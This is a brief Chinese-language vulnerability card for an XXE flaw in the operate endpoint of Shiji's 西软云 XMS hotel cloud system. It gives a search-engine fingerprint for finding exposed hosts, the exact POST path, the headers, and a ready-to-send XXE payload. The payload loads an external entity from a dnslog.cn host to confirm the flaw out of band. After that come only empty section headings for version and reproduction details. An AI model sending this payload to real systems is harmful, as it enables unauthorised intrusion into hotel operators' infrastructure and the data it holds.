# 西软云XMSoperate接口存在XXE漏洞

- **系统**：西软云XMSoperate接口　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`app="shiji-西软云XMS"`
- **请求**：`POST /XopServerRS/rest/futurehotel/operate HTTP/1.1`
- **关键头**：`Content-Length: 79`　`Content-Type: text/xml`

**请求体 / payload**
```
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://q26gls.dnslog.cn"> %remote;]>
```

**其他**
- 西软云XMS operate接口存在XXE漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 西软云XMS